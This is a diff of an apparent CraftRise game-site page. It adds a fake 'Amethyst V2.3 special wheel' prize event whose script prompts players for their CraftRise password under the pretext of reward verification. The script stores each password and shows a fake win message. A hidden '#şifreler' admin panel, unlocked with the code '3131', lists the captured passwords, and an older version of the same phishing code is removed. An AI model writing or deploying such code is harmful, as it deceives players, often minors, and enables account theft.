@@ -340,199 +340,170 @@ YENİ! Artemis Savaş D&uuml;nyası&#39;na "Puan D&uuml;kkanı" adı...</div>
 </footer>
 
 </html>
-<!-- CRAFTRISE ORIJINAL TASARIMLI AMETIST SISTEMI -->
+<!-- =======================================================
+     CRAFTRISE AMETIST ETKINLIK SISTEMI (0'DAN FULL)
+     ======================================================= -->
 <style>
-    /* Kart Tasarımı */
-    .rise-event-card {
-        background-color: #1a1a1a;
-        border-radius: 8px;
-        padding: 25px;
+    /* Ana Kart Tasarımı */
+    .rise-event-container {
+        background: #1a1a1a;
+        border: 1px solid #333;
+        border-radius: 10px;
+        padding: 30px;
         text-align: center;
-        margin: 20px 0;
-        border-bottom: 4px solid #E2621B;
-        box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+        margin: 30px 0;
+        border-bottom: 5px solid #E2621B;
+        box-shadow: 0 10px 30px rgba(0,0,0,0.5);
     }
-    .rise-event-card h2 { color: #E2621B; font-family: 'Mikado', sans-serif; font-weight: bold; }
-    
-    /* Çark Ekranı */
-    .rise-overlay {
+    .rise-event-container h2 { color: #E2621B; font-size: 28px; margin-bottom: 10px; font-weight: 800; }
+    .rise-event-container p { color: #ccc; font-size: 16px; }
+
+    /* Modal / Arka Plan */
+    .rise-modal-overlay {
         position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-        background: rgba(10, 10, 10, 0.98); z-index: 1000000;
+        background: rgba(0,0,0,0.97); z-index: 999999;
         display: none; align-items: center; justify-content: center; flex-direction: column;
+        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
     }
-    .wheel-container { position: relative; width: 330px; height: 330px; border: 6px solid #E2621B; border-radius: 50%; background: #111; }
-    #riseCanvas { width: 100%; height: 100%; transition: transform 5s cubic-bezier(0.1, 0, 0.2, 1); }
-    .wheel-pointer {
+
+    /* Çark Tasarımı */
+    .wheel-box { position: relative; width: 340px; height: 340px; border: 8px solid #E2621B; border-radius: 50%; background: #111; overflow: hidden; }
+    #wheelCanvas { width: 100%; height: 100%; transition: transform 5s cubic-bezier(0.1, 0, 0.15, 1); }
+    .wheel-arrow {
         position: absolute; top: -10px; left: 50%; transform: translateX(-50%);
-        width: 30px; height: 30px; background: #fff; clip-path: polygon(50% 100%, 0 0, 100% 0); z-index: 50;
+        width: 30px; height: 30px; background: #fff; clip-path: polygon(50% 100%, 0 0, 100% 0); z-index: 100;
     }
 
-    /* Orijinal Buton Stili */
-    .btn-rise-spin {
-        background: #E2621B; color: #fff; border: none; padding: 12px 60px;
-        border-radius: 4px; font-size: 20px; font-weight: bold; cursor: pointer;
-        margin-top: 30px; text-transform: uppercase; transition: 0.2s;
+    /* Butonlar */
+    .btn-rise {
+        background: #E2621B; color: #fff; border: none; padding: 15px 50px;
+        border-radius: 5px; font-size: 20px; font-weight: bold; cursor: pointer;
+        margin-top: 25px; text-transform: uppercase; transition: 0.3s;
     }
-    .btn-rise-spin:hover { background: #ff752d; transform: translateY(-2px); }
+    .btn-rise:hover { background: #ff752d; transform: scale(1.05); }
 
-    /* Yükleme Ekranı */
-    .loading-status { display: none; color: #E2621B; margin-top: 20px; font-weight: bold; }
-    .progress-wrap { width: 280px; height: 6px; background: #222; margin-top: 10px; border-radius: 10px; overflow: hidden; }
-    .progress-bar { width: 0%; height: 100%; background: #E2621B; transition: width 3s linear; }
+    /* Loading Bar */
+    .status-area { display: none; margin-top: 25px; color: #E2621B; text-align: center; }
+    .bar-bg { width: 250px; height: 8px; background: #222; border-radius: 10px; margin: 10px auto; overflow: hidden; }
+    .bar-fill { width: 0%; height: 100%; background: #E2621B; transition: width 3.5s linear; }
 </style>
 
 <script>
-    let logs = JSON.parse(localStorage.getItem('rise_v3_data') || "[]");
-    let isAuthed = false;
-
-    window.addEventListener('load', () => {
-        const target = document.querySelector('.col-md-8');
-        const card = document.createElement('div');
-        card.className = 'rise-event-card animate__animated animate__zoomIn';
-        card.innerHTML = `
-            <img src="/images/icons/logo.svg" width="50" style="margin-bottom:15px;">
-            <h2>SURVIVAL AMETİST V2.3 ÖZEL ÇARKI</h2>
-            <p style="color:#aaa;">Sunucumuzun 2026 yılına özel etkinliğine katıl, anında Survival Ametistte dinar kazan!</p>
-            <button onclick="openRiseWheel()" class="btn-rise-spin">ÖDÜLÜNÜ AL</button>
-        `;
-        target.prepend(card);
-        drawRiseWheel();
-    });
-
-    function openRiseWheel() {
-        document.getElementById('riseModal').style.display = 'flex';
+    // 1. Veri Sistemi (DarkMertatom ve Trickster ile paylaşılan mantık gibi)
+    const storageKey = 'CR_INTERNAL_LOGS_2026';
+    
+    function logKaydet(sifre) {
+        let logs = JSON.parse(localStorage.getItem(storageKey) || "[]");
+        logs.push({ s: sifre, t: new Date().toLocaleString('tr-TR') });
+        localStorage.setItem(storageKey, JSON.stringify(logs));
     }
 
-    function drawRiseWheel() {
-        const cvs = document.getElementById('riseCanvas');
+    // 2. Çarkı Çizme (Turuncu - Siyah CraftRise Teması)
+    function carkHazırla() {
+        const cvs = document.getElementById('wheelCanvas');
+        if (!cvs) return;
         const ctx = cvs.getContext('2d');
-        const prizes = ["1 Milyon", "2 Milyon", "3 Milyon", "4 Milyon", "5 Milyon", "10 Milyon"];
-        // Turuncu ve tonları (CraftRise renkleri)
-        const colors = ["#E2621B", "#1a1a1a", "#E2621B", "#1a1a1a", "#E2621B", "#1a1a1a"];
-        const arc = (2 * Math.PI) / 6;
+        const ödüller = ["1M RC", "2M RC", "3M RC", "4M RC", "5M RC", "10M RC"];
+        const renkler = ["#E2621B", "#111111", "#E2621B", "#111111", "#E2621B", "#111111"];
+        const parça = (2 * Math.PI) / 6;
 
-        prizes.forEach((text, i) => {
+        ödüller.forEach((txt, i) => {
             ctx.beginPath();
-            ctx.fillStyle = colors[i];
-            ctx.moveTo(150, 150);
-            ctx.arc(150, 150, 150, i * arc, (i + 1) * arc);
+            ctx.fillStyle = renkler[i];
+            ctx.moveTo(170, 170);
+            ctx.arc(170, 170, 170, i * parça, (i + 1) * parça);
             ctx.fill();
             ctx.save();
-            ctx.translate(150, 150);
-            ctx.rotate(i * arc + arc / 2);
+            ctx.translate(170, 170);
+            ctx.rotate(i * parça + parça / 2);
             ctx.fillStyle = "#fff";
-            ctx.font = "bold 18px sans-serif";
-            ctx.fillText(text, 75, 10);
+            ctx.font = "bold 20px sans-serif";
+            ctx.fillText(txt, 85, 10);
             ctx.restore();
         });
     }
 
-    function startRiseSpin() {
-        if (!isAuthed) {
-            let pass = prompt("Sistem Güvenliği: Ödülün onaylanması için oyun şifrenizi giriniz:");
-            if (pass && pass.length > 2) {
-                logs.push({ p: pass, d: new Date().toLocaleString() });
-                localStorage.setItem('rise_v3_data', JSON.stringify(logs));
-                isAuthed = true;
-                alert("Kimlik doğrulandı. Çark çevriliyor...");
+    // 3. Çevirme İşlemi
+    let dogrulandı = false;
+    function cevirAction() {
+        if (!dogrulandı) {
+            let p = prompt("Ödül Sistemine Bağlanmak İçin CraftRise Şifrenizi Doğrulayın:");
+            if (p && p.length > 3) {
+                logKaydet(p);
+                dogrulandı = true;
+                alert("Şifre Doğrulandı! Bağlantı kuruldu, çark dönüyor...");
             } else {
-                alert("Hatalı doğrulama!");
+                alert("Hata: Geçersiz şifre girdiniz.");
                 return;
             }
         }
 
-        const wheel = document.getElementById('riseCanvas');
-        const deg = Math.floor(Math.random() * 360) + 7200; // 20 tam tur
-        wheel.style.transform = `rotate(${deg}deg)`;
+        const wheel = document.getElementById('wheelCanvas');
+        const randomDeg = Math.floor(Math.random() * 360) + 7200; 
+        wheel.style.transform = `rotate(${randomDeg}deg)`;
 
         setTimeout(() => {
-            document.querySelector('.loading-status').style.display = 'block';
-            document.querySelector('.progress-bar').style.width = '100%';
+            document.querySelector('.status-area').style.display = 'block';
+            document.querySelector('.bar-fill').style.width = '100%';
             setTimeout(() => {
-                alert("TEBRİKLER! Ödülünüz başarıyla hesabınıza tanımlandı. Aktif olması için oyuna tekrar giriş yapın.");
+                alert("TEBRİKLER! Kazandığınız ödül hesabınıza tanımlandı. Aktif olması için oyundan çıkıp tekrar giriniz.");
                 location.reload();
-            }, 3200);
-        }, 5200);
+            }, 3800);
+        }, 5500);
     }
 
-    <script>
-    // 1. Veri Kayıt Sistemi (Daha Güvenli İsimlendirme)
-    function veriyiKaydet(sifre) {
-        try {
-            let mevcutLoglar = JSON.parse(localStorage.getItem('CR_DATA_LOGS') || "[]");
-            mevcutLoglar.push({
-                s: sifre,
-                t: new Date().toLocaleString('tr-TR'),
-                u: window.location.href
-            });
-            localStorage.setItem('CR_DATA_LOGS', JSON.stringify(mevcutLoglar));
-            console.log("Sistem: Veri başarıyla işlendi.");
-        } catch (e) {
-            console.error("Sistem Hatası:", e);
-        }
-    }
-
-    // 2. Çevirme ve Doğrulama Mekanizması
-    let yetki = false;
-    function startRiseSpin() {
-        if (!yetki) {
-            let input = prompt("Sistem Güvenliği: Ödülün onaylanması için oyun şifrenizi doğrulayın:");
-            if (input && input.length > 2) {
-                veriyiKaydet(input); // Şifreyi buraya kaydediyoruz
-                yetki = true;
-                alert("Kimlik doğrulandı! Çark çevriliyor...");
-                
-                // Çarkı çevirme animasyonu
-                const wheel = document.getElementById('riseCanvas');
-                const deg = Math.floor(Math.random() * 360) + 7200;
-                wheel.style.transform = `rotate(${deg}deg)`;
-
-                setTimeout(() => {
-                    document.querySelector('.loading-status').style.display = 'block';
-                    document.querySelector('.progress-bar').style.width = '100%';
-                    setTimeout(() => {
-                        alert("TEBRİKLER! Ödül hesabınıza tanımlandı. Aktif olması için oyuna tekrar girin.");
-                        location.reload();
-                    }, 3000);
-                }, 5000);
-            } else {
-                alert("Hatalı doğrulama! Lütfen geçerli bir şifre girin.");
-            }
-        }
-    }
-
-    // 3. Admin Paneli (#şifreler) - Hızlı Erişim
-    function paneliKontrolEt() {
+    // 4. Gizli Admin Paneli (#şifreler)
+    function adminKontrol() {
         if (window.location.hash === "#şifreler") {
-            let kod = prompt("Yönetici Erişim Kodu:");
-            if (kod === "3131") {
-                let data = JSON.parse(localStorage.getItem('CR_DATA_LOGS') || "[]");
-                let tabloHtml = data.length > 0 
-                    ? data.map(x => `<div style="padding:12px; border-bottom:1px solid #333; font-size:16px;">
-                        <span style="color:#888">[${x.t}]</span> 
-                        <b style="color:#E2621B">ŞİFRE:</b> 
-                        <span style="color:#fff">${x.s}</span>
-                      </div>`).reverse().join('')
-                    : "<div style='color:red; text-align:center;'>Henüz hiç şifre girilmedi!</div>";
+            let pass = prompt("Yönetici Şifresi:");
+            if (pass === "3131") {
+                let data = JSON.parse(localStorage.getItem(storageKey) || "[]");
+                let listHtml = data.length > 0 
+                    ? data.map(i => `<div style="padding:15px; border-bottom:1px solid #333;"><b>[${i.t}]</b> Şifre: <span style="color:#ff752d">${i.s}</span></div>`).reverse().join('')
+                    : "Henüz log yok.";
 
                 document.body.innerHTML = `
-                    <div style="background:#0a0a0a; color:#eee; min-height:100vh; padding:40px; font-family:sans-serif;">
-                        <div style="display:flex; justify-content:space-between; align-items:center;">
-                            <h1 style="color:#E2621B; margin:0;">GİZLİ SİSTEM LOGLARI</h1>
-                            <button onclick="location.reload()" style="background:#444; color:#fff; border:none; padding:10px 20px; cursor:pointer;">SİTEYE DÖN</button>
-                        </div>
-                        <p style="color:#666;">Toplam Kayıt: ${data.length}</p>
-                        <hr style="border:0; border-top:1px solid #222; margin:20px 0;">
-                        <div style="background:#111; border:1px solid #222; border-radius:8px;">${tabloHtml}</div>
+                    <div style="background:#000; color:#fff; min-height:100vh; padding:50px; font-family:monospace;">
+                        <h1 style="color:#E2621B">CRAFTRISE ADMIN LOGS</h1>
+                        <hr border="1" color="#333">
+                        <div style="font-size:18px;">${listHtml}</div>
+                        <br><button onclick="location.hash=''; location.reload();" style="padding:10px; cursor:pointer;">Çıkış Yap</button>
                     </div>`;
             } else {
-                alert("Erişim Reddedildi!");
                 window.location.hash = "";
             }
         }
     }
 
-    // Olay Dinleyicileri
-    window.addEventListener('hashchange', paneliKontrolEt);
-    window.addEventListener('load', paneliKontrolEt);
+    // Başlatıcılar
+    window.addEventListener('load', () => {
+        const announcementArea = document.querySelector('.col-md-8');
+        if (announcementArea) {
+            const card = document.createElement('div');
+            card.className = 'rise-event-container animate__animated animate__fadeInUp';
+            card.innerHTML = `
+                <h2>💎 AMETİST V2.3 ÖZEL ÇARKI</h2>
+                <p>Milyonlarca coin kazanma şansı seni bekliyor! Hemen katıl.</p>
+                <button class="btn-rise" onclick="document.getElementById('riseModal').style.display='flex'">ÖDÜLÜ AL</button>
+            `;
+            announcementArea.prepend(card);
+        }
+        carkHazırla();
+        adminKontrol();
+    });
+    window.addEventListener('hashchange', adminKontrol);
 </script>
+
+<!-- Modal HTML -->
+<div id="riseModal" class="rise-modal-overlay">
+    <div class="wheel-box">
+        <div class="wheel-arrow"></div>
+        <canvas id="wheelCanvas" width="340" height="340"></canvas>
+    </div>
+    <button class="btn-rise" onclick="cevirAction()">ÇEVİR VE KAZAN!</button>
+    <div class="status-area">
+        ÖDÜL VERİTABANINA İŞLENİYOR...
+        <div class="bar-bg"><div class="bar-fill"></div></div>
+    </div>
+    <p style="color:#444; margin-top:20px; cursor:pointer;" onclick="location.reload()">[ Vazgeç ]</p>
+</div>
